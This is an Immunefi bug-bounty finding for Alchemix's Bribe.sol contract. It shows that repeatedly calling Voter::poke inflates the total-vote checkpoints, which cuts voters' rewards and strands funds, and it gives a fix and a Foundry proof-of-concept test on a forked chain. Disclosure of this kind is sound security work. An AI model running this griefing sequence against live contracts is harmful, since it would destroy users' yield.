---
# Core Classification
protocol: Alchemix
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 38202
audit_firm: Immunefi
contest_link: https://immunefi.com/bounty/alchemix-boost/
source_link: none
github_link: https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/Alchemix/31409%20-%20%5bSC%20-%20Critical%5d%20Users%20can%20grief%20Bribe%20rewards%20forcing%20them%20to%20b....md

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - liquid_staking
  - dexes
  - yield
  - cross_chain
  - rwa

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - OxAlix2
---

## Vulnerability Title

Users can grief Bribe rewards, forcing them to be stuck forever by continuously calling `Voter::poke`

### Overview


This report is about a bug in a smart contract on the GitHub website. The contract in question is called "Bribe.sol" and it is used for voting and distributing rewards. The bug has two main impacts: it can freeze rewards and it can cause damage to users or the protocol. The bug is caused by a discrepancy between the deposit and withdrawal functions in the contract. When users vote, the contract increases the total votes, but when they withdraw their votes, the total votes are not decreased. This allows users to manipulate the rewards by continuously resetting and voting again. As a result, users may receive less rewards than they should and some rewards may become stuck in the contract forever. The report suggests a solution to fix the bug and provides a proof of concept to demonstrate the issue.

### Original Finding Content

Report type: Smart Contract


Target: https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol

Impacts:
- Permanent freezing of unclaimed yield
- Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description
## Brief/Intro
When users vote in the `Voter` contract, it calls `Bribe::deposit` to "save" this vote, so that later when rewards come in for that Bribe can be distributed to users who voted. The opposite happens when users reset/withdraw their votes. However, there's 1 anomaly between the Bribe's deposit and withdrawal, where on deposit, Bribe is "checkpointing" the votes using:
```
totalVoting += amount;
_writeVotingCheckpoint()
```
And the opposite is not happening on the withdrawal, this allows users to mess up all the Bribe's rewards.

## Vulnerability Details
When users vote in the `Voter` contract, it calls `Bribe::deposit` which increases the total votes of that Bribe, however, on withdrawal these votes aren't being subtracted. On the other hand, the `Voter` contract allows users to continuously call the `poke` function that resets and then vote again in the same gauges/bribes, without any condition on that function. This allows voters to continuously call the `poke` function to skyrocket the total votes checkpoints in the Bribe, remember when `poke` resets/withdraws the votes they are not being removed.

These total votes' checkpoints are being used in `Bribe::earned`, to calculate the earned amount to each voter, it is being divided by, https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L261, which wrongly decrease the rewards for each user.

## Impact Details
* Griefing of users, as their rewards will be a lot less than what they "deserve", if there were even some rewards left.
* The remaining unclaimed rewards will remain stuck forever in the contract.

## References
https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L319-L329

## Mitigation
Add the following in `Bribe::withdraw`:
```
totalVoting -= amount;
_writeVotingCheckpoint();
```
 

## Proof of concept
Fork block number used: `19877251`

```
function testGriefBribeRewards() public {
    // Bribe config
    uint256 usdcRewardAmount = 100e6;
    hevm.prank(voter.admin());
    voter.whitelist(usdc);
    address bribeAddress = voter.bribes(voter.gauges(alUsdPoolAddress));
    deal(address(usdc), address(this), usdcRewardAmount);
    IERC20(usdc).approve(bribeAddress, usdcRewardAmount);

    // Admin and Beef create locks
    uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
    uint256 tokenId2 = createVeAlcx(beef, TOKEN_1, MAXTIME, false);

    address[] memory pools = new address[](1);
    pools[0] = alUsdPoolAddress;
    uint256[] memory weights = new uint256[](1);
    weights[0] = 5000;

    // Admin and Beef vote
    hevm.prank(admin);
    voter.vote(tokenId1, pools, weights, 0);
    hevm.prank(beef);
    voter.vote(tokenId2, pools, weights, 0);

    // Confirm voting success
    assertGt(IBribe(bribeAddress).totalVoting(), 0);

    // Increase time to reach just before epoch end
    hevm.warp(IBribe(bribeAddress).getEpochStart(block.timestamp) + 2 weeks - 1 hours);

    // Beef continously calls poke, messing up votes checkpoints in the Bribe contract
    hevm.startPrank(beef);
    voter.poke(tokenId2);
    hevm.warp(block.timestamp + 1);
    voter.poke(tokenId2);
    hevm.warp(block.timestamp + 1);
    voter.poke(tokenId2);
    hevm.warp(block.timestamp + 1);
    voter.poke(tokenId2);
    hevm.warp(block.timestamp + 1);
    voter.poke(tokenId2);
    hevm.stopPrank();

    // Rewards come in to the Bribe contract
    IBribe(bribeAddress).notifyRewardAmount(usdc, usdcRewardAmount);

    // Epoch ends
    hevm.warp(block.timestamp + 1 hours);

    // Voting still exists
    assertGt(IBribe(bribeAddress).totalVoting(), 0);
    // Rewards for each token is around 14 USDC where it should be 50 USDC (100 USDC / 2 tokens)
    assertEq(IBribe(bribeAddress).earned(usdc, tokenId1) / 1e6, 14);
    assertEq(IBribe(bribeAddress).earned(usdc, tokenId2) / 1e6, 14);
}
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Immunefi |
| Protocol | Alchemix |
| Report Date | N/A |
| Finders | OxAlix2 |

### Source Links

- **Source**: N/A
- **GitHub**: https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/Alchemix/31409%20-%20%5bSC%20-%20Critical%5d%20Users%20can%20grief%20Bribe%20rewards%20forcing%20them%20to%20b....md
- **Contest**: https://immunefi.com/bounty/alchemix-boost/

### Keywords for Search

`vulnerability`

